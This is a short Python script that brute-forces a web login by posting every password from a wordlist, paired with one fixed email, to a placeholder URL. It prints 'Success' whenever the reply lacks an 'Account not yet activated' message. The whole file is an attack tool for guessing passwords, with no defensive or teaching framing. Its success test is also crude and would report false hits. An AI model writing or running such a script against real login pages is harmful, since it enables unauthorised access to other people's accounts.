import requests

url = 'example.com'
arg = open('insertwordlist.txt').readlines()

for line in arg:
    password = line.strip()
    email = 'example@gmail.com'
    http = requests.post(url, data={'email':email, 'password': password})
    #Account not yet activated!
    print(f"Trying {email} : {password}...")
    if "Account not yet activated" in http.text:
        print("Password incorrect")

    else:
        print('Success')
